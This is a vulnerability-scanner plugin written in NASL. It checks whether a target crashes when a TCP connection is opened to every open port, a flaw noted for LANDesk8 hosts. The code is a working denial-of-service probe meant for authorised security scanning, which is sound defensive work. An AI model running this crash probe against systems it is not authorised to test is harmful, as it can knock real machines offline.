if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15571" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_name( "connect to all open ports" );
	script_category( ACT_KILL_HOST );
	script_copyright( "Copyright (C) 2004 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "secpod_open_tcp_ports.sc" );
	script_mandatory_keys( "TCP/PORTS" );
	script_tag( name: "solution", value: "Inform your software vendor(s) and patch your system." );
	script_tag( name: "summary", value: "It was possible to crash the remote system by connecting
  to every open port.

  This is known to bluescreen machines running LANDesk8
  (In this case, connecting to two ports is enough)." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_probe" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
start_denial();
alive = end_denial();
if(!alive){
	exit( 0 );
}
ports = tcp_get_all_ports();
if(isnull( ports )){
	exit( 0 );
}
i = 0;
for port in ports {
	s[i] = open_sock_tcp( port );
	if(s[i]){
		i++;
	}
}
if(i == 0){
	exit( 0 );
}
alive = end_denial();
if(!alive){
	security_message( port: 0 );
	exit( 0 );
}
for(j = 0;j < i;j++){
	close( s[j] );
}
exit( 99 );

